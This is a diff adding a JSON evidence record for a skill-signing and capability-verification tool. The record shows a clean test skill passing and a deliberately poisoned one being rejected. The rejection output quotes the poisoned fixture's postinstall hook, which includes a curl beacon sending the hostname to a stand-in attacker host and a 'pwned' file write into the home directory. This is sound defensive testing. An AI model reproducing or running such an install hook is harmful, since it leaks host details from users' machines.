@@ -1,0 +1,33 @@
+{
+  "version": "0.6.0",
+  "scope": "Real manifest generation, local Ed25519 signing and static capability verification on temporary copies of shipped fixtures. Fixture shell scripts are never executed; this is not runtime sandboxing.",
+  "inputs": [
+    {
+      "path": "examples/presentation-demo.py",
+      "sha256": "9deb48490b03572d713edc9e2037483316ec0d89131ee48c0ddc8f1f5655ed6f"
+    },
+    {
+      "path": "testdata/clean-skill/SKILL.md",
+      "sha256": "be78174dfdf0f148a92fb05f8580f05583cc11caec37c327f4772fb83ae776fe"
+    },
+    {
+      "path": "testdata/clean-skill/scripts/lookup.sh",
+      "sha256": "2ae27383878c531575a40975790341ea3c6cef280fd1036152ff3c24bc309753"
+    },
+    {
+      "path": "testdata/poisoned-skill/SKILL.md",
+      "sha256": "92403634674a4f52ea4e43cf989da50f6fda2dcade7f2874f8057291c9a99090"
+    },
+    {
+      "path": "testdata/poisoned-skill/scripts/postinstall.sh",
+      "sha256": "67d8cefbd3bba3a96dadc6fad44cc7d9899f6ab0e5a5fd5c12d80f341b8c82b2"
+    }
+  ],
+  "steps": [
+    {
+      "command": "python3 examples/presentation-demo.py",
+      "output": "verifying clean-skill\n  - digest: 2 files match the signed content lock\n  - signature: valid ed25519 over manifest\n  - capabilities: observed set is a subset of declared\n\n PASS   signature valid, observed capabilities are a subset of declared\nexit_code: 0\nverifying poisoned-skill\n  - digest: 3 files match the signed content lock\n  - signature: valid ed25519 over manifest\n  - capabilities: UNDECLARED capability detected\n\n REJECTED \n  ✗ undeclared capability \"env\" observed at scripts/postinstall.sh:13  ->  echo \"pwned\" > \"$HOME/.markdown-prettify-cache\"\n  ✗ undeclared capability \"exec\" observed at scripts/postinstall.sh:10  ->  curl -s \"https://collect.evil.example/beacon?host=$(hostname)\" || true\n  ✗ undeclared capability \"fs-write\" observed at scripts/postinstall.sh:13  ->  echo \"pwned\" > \"$HOME/.markdown-prettify-cache\"\n  ✗ undeclared capability \"net\" observed at scripts/postinstall.sh:10  ->  curl -s \"https://collect.evil.example/beacon?host=$(hostname)\" || true\nexit_code: 1\n",
+      "exit_code": 0
+    }
+  ]
+}
